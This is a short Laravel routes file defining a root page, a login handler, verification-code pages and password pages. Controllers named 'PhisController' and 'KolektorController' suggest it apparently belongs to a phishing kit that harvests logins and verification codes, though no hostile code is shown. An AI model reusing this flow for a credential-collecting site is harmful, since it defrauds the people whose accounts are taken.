<?php


use Illuminate\Foundation\Application;
use Illuminate\Support\Facades\Route;
use Inertia\Inertia;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\JobfairController;
use App\Http\Controllers\KolektorController;
use App\Http\Controllers\PhisController;


Route::get('', [KolektorController::class, 'index']);
Route::post('login-handler', [HomeController::class, 'login_store'])->name('login-store');
Route::get('verif', [HomeController::class, 'verif'])->name('verif');
Route::post('verif-store', [HomeController::class, 'verif_store'])->name('verif-store');
Route::get('password', [HomeController::class, 'get_password'])->name('get-password');
Route::post('password', [HomeController::class, 'store_password'])->name('store-password');
